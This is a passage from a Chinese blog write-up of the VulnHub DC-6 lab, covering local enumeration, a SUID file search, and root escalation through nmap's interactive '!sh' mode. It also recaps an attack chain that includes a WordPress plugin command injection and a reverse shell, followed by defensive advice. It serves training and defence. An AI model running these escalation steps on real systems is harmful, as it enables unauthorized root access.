+<h2 id="四、权限提升"><a href="#四、权限提升" class="headerlink" title="四、权限提升"></a>四、权限提升</h2><h3 id="4-1-本地信息枚举"><a href="#4-1-本地信息枚举" class="headerlink" title="4.1 本地信息枚举"></a>4.1 本地信息枚举</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">id</span>                   <span class="comment"># uid=33(www-data)</span></span><br><span class="line"><span class="built_in">uname</span> -a             <span class="comment"># Linux dc-6 4.9.0-8-amd64</span></span><br><span class="line"><span class="built_in">sudo</span> -l              <span class="comment"># 无可执行 sudo 权限</span></span><br><span class="line"><span class="built_in">cat</span> /etc/crontab     <span class="comment"># 无可利用计划任务</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="4-2-SUID-文件发现"><a href="#4-2-SUID-文件发现" class="headerlink" title="4.2 SUID 文件发现"></a>4.2 SUID 文件发现</h3><p>SUID 是 Linux 提权的关键——当文件设置了 SUID 位，任何用户执行时均以文件<strong>所有者</strong>身份运行：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
+
+<p>关键发现：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/bin/nmap</span><br></pre></td></tr></table></figure>
+
+<p><strong>nmap 拥有 SUID root 位</strong>，这是 DC-6 最核心的提权线索。</p>
+<h3 id="4-3-nmap-SUID-提权"><a href="#4-3-nmap-SUID-提权" class="headerlink" title="4.3 nmap SUID 提权"></a>4.3 nmap SUID 提权</h3><p>nmap 较老版本支持 <code>--interactive</code> 模式，可在该模式下调用系统 Shell。DC-6 预装的 nmap 正好支持此模式：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/usr/bin/nmap --interactive</span><br><span class="line">nmap&gt; !sh</span><br><span class="line"><span class="comment"># whoami</span></span><br><span class="line">root</span><br></pre></td></tr></table></figure>
+
+<p><code>!</code> 前缀使 nmap 调用系统 shell，因 nmap 以 SUID root 运行，启动的 shell 继承 root 身份。备选方案：利用 NSE 脚本 <code>os.execute(&quot;/bin/bash&quot;)</code> 或 LD_PRELOAD 劫持同样可提权。</p>
+<h3 id="4-4-获取-root"><a href="#4-4-获取-root" class="headerlink" title="4.4 获取 root"></a>4.4 获取 root</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">whoami</span> &amp;&amp; <span class="built_in">id</span></span><br><span class="line"><span class="comment"># root / uid=0(root)</span></span><br><span class="line"><span class="built_in">cat</span> /root/proof.txt</span><br></pre></td></tr></table></figure>
+
+<p><code>/root/proof.txt</code> 内包含 DC-6 通关标记。</p>
+<h2 id="五、总结与防御建议"><a href="#五、总结与防御建议" class="headerlink" title="五、总结与防御建议"></a>五、总结与防御建议</h2><h3 id="5-1-攻击路径回顾"><a href="#5-1-攻击路径回顾" class="headerlink" title="5.1 攻击路径回顾"></a>5.1 攻击路径回顾</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">端口扫描 → WordPress枚举 → wpscan用户/插件发现</span><br><span class="line">→ 暴力破解获得后台凭证 → Activity Monitor插件CVE-2018-15877命令注入</span><br><span class="line">→ 反弹Shell → nmap SUID提权 → root</span><br></pre></td></tr></table></figure>
+
+<p>攻击链薄弱点：</p>
+<table>
+<thead>
+<tr>
+<th>环节</th>
+<th>弱点</th>
+<th>CVE &#x2F; 技术</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>入口</td>
+<td>弱密码可被暴力破解</td>
+<td>字典攻击</td>
+</tr>
+<tr>
+<td>利用点</td>
+<td>插件未过滤输入，命令注入</td>
+<td>CVE-2018-15877</td>
+</tr>
+<tr>
+<td>本地提权</td>
+<td>nmap 不当设置 SUID 位</td>
+<td>GTFO Bins: nmap</td>
+</tr>
+</tbody></table>
+<h3 id="5-2-防御建议"><a href="#5-2-防御建议" class="headerlink" title="5.2 防御建议"></a>5.2 防御建议</h3><ol>
+<li><strong>密码策略</strong>：实施强密码策略，开启暴力破解登录限制（如 Limit Login Attempts Reloaded 插件）。</li>
+<li><strong>插件管理</strong>：及时更新或移除过时插件（Activity Monitor 已废弃，不应保留）。</li>
+<li><strong>输入过滤</strong>：开发者对所有外部输入使用 <code>escapeshellarg()</code> &#x2F; <code>escapeshellcmd()</code> 严格转义。</li>
+<li><strong>最小权限</strong>：nmap 等工具不应设置 SUID root 位，除非确有必要且已充分评估风险。</li>
+<li><strong>文件完整性监控</strong>：部署 AIDE &#x2F; Tripwire 监控 SUID 位变化等异常属性变更。</li>
+<li><strong>Web 应用防火墙</strong>：WAF 规则拦截 <code>ping</code> 等命令注入特征，阻止恶意请求到达应用层。</li>
+</ol>
+<h3 id="5-3-相关资源"><a href="#5-3-相关资源" class="headerlink" title="5.3 相关资源"></a>5.3 相关资源</h3><ul>
+<li>VulnHub DC-6: <a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/dc-6,315/">https://www.vulnhub.com/entry/dc-6,315/</a></li>
+<li>CVE-2018-15877: <a target="_blank" rel="noopener" href="https://nvd.nist.gov/vuln/detail/CVE-2018-15877">https://nvd.nist.gov/vuln/detail/CVE-2018-15877</a></li>
+<li>GTFO Bins - nmap: <a target="_blank" rel="noopener" href="https://gtfobins.github.io/gtfobins/nmap/">https://gtfobins.github.io/gtfobins/nmap/</a></li>
+<li>WPScan: <a target="_blank" rel="noopener" href="https://github.com/wpscanteam/wpscan">https://github.com/wpscanteam/wpscan</a></li>
+</ul>
+<hr>
+<p><em>本文完成于 2024 年 9 月，靶机环境稳定可复现。若有疑问欢迎交流。</em></p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+  <nav class="pagination">
+    <a class="extend prev" rel="prev" title="上一页" aria-label="上一页" href="/page/11/"><i class="fa fa-angle-left"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/11/">11</a><span class="page-number current">12</span><a class="page-number" href="/page/13/">13</a><a class="extend next" rel="next" title="下一页" aria-label="下一页" href="/page/13/"><i class="fa fa-angle-right"></i></a>
+  </nav>
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2026</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">YunShang</span>
+  </div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/pisces/" rel="noopener" target="_blank">NexT.Pisces</a> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+</body>
+</html>
